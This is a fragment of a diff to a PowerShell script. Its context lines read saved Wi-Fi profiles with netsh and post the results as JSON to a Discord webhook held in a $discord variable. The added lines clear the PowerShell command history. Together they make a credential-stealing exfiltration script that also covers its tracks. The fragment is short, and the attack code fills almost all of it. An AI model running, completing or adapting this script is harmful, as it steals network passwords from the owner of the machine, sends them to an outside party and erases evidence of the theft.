@@ -10,3 +10,6 @@ netsh wlan show profile | Select-String '(?<=Tutti i profili utente\s+:\s).+' | 
 	
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 }
+
+# Clear the PowerShell command history
+Clear-History
